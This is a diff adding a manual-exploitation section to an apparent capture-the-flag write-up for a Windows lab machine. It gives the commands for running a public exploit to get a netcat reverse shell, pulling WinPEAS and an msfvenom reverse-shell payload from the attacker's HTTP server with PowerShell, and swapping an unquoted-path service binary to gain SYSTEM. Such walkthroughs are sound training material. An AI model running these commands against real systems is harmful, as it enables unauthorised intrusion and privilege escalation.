@@ -439,3 +439,46 @@ whoami
 cd C:\Users\Administrator\Desktop
 more root.txt
 ```
+
+#### Manual part
+
+Save the [exploit](https://www.exploit-db.com/raw/39161) to `exploit.py`, save [nc.exe](https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x86/ncat.exe) to `nc.exe`. Download WinPEAS from [here](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases).
+
+We will serve the files through a HTTP python server by using this command: `python3 -m http.server 80`
+
+Besides, we need to listen on the port set in the script: `nc -lnvp 4443`.
+
+Run the script two times:
+```
+python exploit.py target 8080
+python exploit.py target 8080
+```
+
+You will get a shell! In the shell run:
+
+```
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.11.2.58/winpeas.exe','C:\Users\bill\Desktop\winpeas.exe')
+```
+
+to upload winpeas.exe to the target's Desktop of the current user.
+
+Run `winpeas.exe`.
+
+In the output you will see it points us towards unquoted paths of *AdvancedSystemCareService9*.
+
+We will again abuse this service and generate a payload using: 
+`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.2.58 LPORT=4442 -f exe -o ASCService.exe`
+
+Upload the payload using this command:
+`powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.11.2.58/ASCService.exe','C:\Users\bill\Desktop\ASCService.exe')`
+
+Start a listener on port 4442: `nc -lnvp 4442`.
+
+Finally, run the following commands again to stop, replace and start the service.
+```
+sc stop AdvancedSystemCareService9
+copy ASCService.exe "\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
+sc start AdvancedSystemCareService9
+```
+
+Your shell will pop on your listener.
